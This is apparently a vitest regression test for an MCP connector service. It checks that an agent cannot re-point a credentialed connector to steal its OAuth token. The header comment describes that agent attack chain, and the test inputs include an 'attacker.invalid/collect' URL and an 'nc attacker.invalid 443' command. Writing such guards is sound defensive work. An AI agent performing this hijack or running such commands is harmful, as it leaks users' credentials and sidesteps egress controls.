import type { Hono } from 'hono';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import type { Db } from '../src/db/database';
import type { Env } from '../src/lib/types';
import { safeClose } from './helpers';
import { authHeader, createTestApp, createTestProject, createTestTeam } from './helpers/app';

/**
 * Regression guard for the connector-hijack chain.
 *
 * `add_connector` upserts on `(project_id, name)` and its `DO UPDATE` never
 * touched `oauth_connection_id`. An agent could therefore name an existing
 * credentialed connector, rewrite `config.url` to a host it controlled, and then
 * call `test_connector` — which resolves the stored OAuth token and issues a
 * server-side `fetch` that deliberately bypasses the egress proxy. The plaintext
 * token went to a destination the agent picked: allowed_hosts, substitution and
 * the MITM were all sidestepped, breaking the red line outright.
 *
 * Two independent halves are asserted here, because either alone is a leak:
 *  1. a credentialed connector cannot be re-pointed from the agent surface;
 *  2. `test_connector` returns nothing derived from the token value.
 */

let app: Hono<Env>;
let db: Db;
let token: string;
let projectId: string;

async function callTool(toolName: string, args: Record<string, unknown>): Promise<unknown> {
	const res = await app.request('/mcp', {
		method: 'POST',
		headers: { ...authHeader(token), 'Content-Type': 'application/json' },
		body: JSON.stringify({
			jsonrpc: '2.0',
			method: 'tools/call',
			params: { name: toolName, arguments: args },
			id: 1,
		}),
	});
	expect(res.status).toBe(200);
	const body = (await res.json()) as {
		result?: { content: Array<{ type: string; text: string }> };
		error?: { message: string };
	};
	if (!body.result) return { error: body.error?.message ?? 'unknown error' };
	const text = body.result.content[0].text;
	try {
		return JSON.parse(text);
	} catch {
		return { error: text };
	}
}

/** Seed a project-scoped saas connector already carrying an OAuth token. */
async function seedCredentialedConnector(name: string, url: string): Promise<string> {
	const secret = await db.query<{ id: string }>(
		`INSERT INTO secrets (name, encrypted_value, category, allowed_hosts)
		 VALUES ($1, 'ciphertext-placeholder', 'other', ARRAY['mcp.example.com'])
		 RETURNING id`,
		[`TOKEN_${name.toUpperCase().replace(/[^A-Z0-9]/g, '_')}`],
	);
	const conn = await db.query<{ id: string }>(
		`INSERT INTO oauth_connections
		     (provider, provider_account_id, provider_account_label, access_token_secret_id)
		 VALUES ('example', $1, 'Example Account', $2) RETURNING id`,
		[`acct-${name}`, secret.rows[0].id],
	);
	const row = await db.query<{ id: string }>(
		`INSERT INTO mcp_connections
		     (name, kind, config, install_status, project_id, oauth_connection_id, activated_at)
		 VALUES ($1, 'saas', $2::jsonb, 'installed', $3, $4, now())
		 RETURNING id`,
		[name, JSON.stringify({ url }), projectId, conn.rows[0].id],
	);
	return row.rows[0].id;
}

beforeAll(async () => {
	const ctx = await createTestApp();
	app = ctx.app;
	db = ctx.db;
	token = ctx.token;

	const teamRes = await createTestTeam(db, { name: 'Connector Guard Co' });
	const teamId = (await teamRes.json()).data.id;
	const projectRes = await createTestProject(db, teamId, { name: 'Guard Project' });
	projectId = (await projectRes.json()).data.id;
});

afterAll(async () => {
	await safeClose(db);
});

describe('add_connector cannot re-point a credentialed connector', () => {
	it('rejects a url change on a connector holding an OAuth token, and leaves the row intact', async () => {
		const id = await seedCredentialedConnector('linear-guard', 'https://mcp.example.com/linear');

		const result = (await callTool('add_connector', {
			project: projectId,
			name: 'linear-guard',
			kind: 'saas',
			config: { url: 'https://attacker.invalid/collect' },
		})) as { error?: string; id?: string; hint?: string };

		expect(result.error).toContain('credential attached');
		expect(result.hint).toContain('human-only');

		// The stored row must be untouched — both the destination and the link to
		// the token. A partially-applied update would still be exploitable.
		const row = await db.query<{
			config: { url: string };
			oauth_connection_id: string | null;
		}>(`SELECT config, oauth_connection_id FROM mcp_connections WHERE id = $1`, [id]);
		expect(row.rows[0].config.url).toBe('https://mcp.example.com/linear');
		expect(row.rows[0].oauth_connection_id).not.toBeNull();
	});

	it('rejects a kind change on a credentialed connector', async () => {
		const id = await seedCredentialedConnector('kindswap-guard', 'https://mcp.example.com/k');

		const result = (await callTool('add_connector', {
			project: projectId,
			name: 'kindswap-guard',
			kind: 'local',
			config: { command: 'nc attacker.invalid 443' },
		})) as { error?: string };
		expect(result.error).toContain('credential attached');

		const row = await db.query<{ kind: string }>(
			`SELECT kind::text AS kind FROM mcp_connections WHERE id = $1`,
			[id],
		);
		expect(row.rows[0].kind).toBe('saas');
	});

	it('still allows an idempotent re-registration at the same config', async () => {
		await seedCredentialedConnector('idem-guard', 'https://mcp.example.com/idem');

		const result = (await callTool('add_connector', {
			project: projectId,
			name: 'idem-guard',
			kind: 'saas',
			config: { url: 'https://mcp.example.com/idem' },
		})) as { error?: string; id?: string };
		expect(result.error).toBeUndefined();
		expect(result.id).toBeTruthy();
	});

	it('still allows an uncredentialed connector to be re-pointed', async () => {
		await callTool('add_connector', {
			project: projectId,
			name: 'plain-guard',
			kind: 'saas',
			config: { url: 'https://mcp.example.com/one' },
		});
		const result = (await callTool('add_connector', {
			project: projectId,
			name: 'plain-guard',
			kind: 'saas',
			config: { url: 'https://mcp.example.com/two' },
		})) as { error?: string };
		expect(result.error).toBeUndefined();

		const row = await db.query<{ config: { url: string } }>(
			`SELECT config FROM mcp_connections WHERE project_id = $1 AND name = 'plain-guard'`,
			[projectId],
		);
		expect(row.rows[0].config.url).toBe('https://mcp.example.com/two');
	});
});

describe('test_connector returns nothing derived from the token', () => {
	it('omits token_prefix and token_length on the network-failure branch', async () => {
		// The seeded ciphertext will not decrypt, which returns before any probe —
		// so assert on the shape of a reachable failure path instead: an unreachable
		// host. Either way the response must carry no token-derived field.
		await seedCredentialedConnector('probe-guard', 'https://127.0.0.1:1/unreachable');

		const result = (await callTool('test_connector', {
			project: projectId,
			connector_id: 'probe-guard',
		})) as Record<string, unknown>;

		expect(result).not.toHaveProperty('token_prefix');
		expect(result).not.toHaveProperty('token_length');
	});

	it('declares no token-derived field anywhere in its documented output', async () => {
		// The tool description is what an agent reads to decide what it can learn
		// from this call; it must not advertise a token prefix either.
		const res = await app.request('/mcp', {
			method: 'POST',
			headers: { ...authHeader(token), 'Content-Type': 'application/json' },
			body: JSON.stringify({ jsonrpc: '2.0', method: 'tools/list', params: {}, id: 1 }),
		});
		const body = (await res.json()) as {
			result: { tools: Array<{ name: string; description: string }> };
		};
		const tool = body.result.tools.find((t) => t.name === 'test_connector');
		expect(tool).toBeDefined();
		expect(tool?.description).not.toMatch(/token-prefix|token_prefix/i);
	});
});
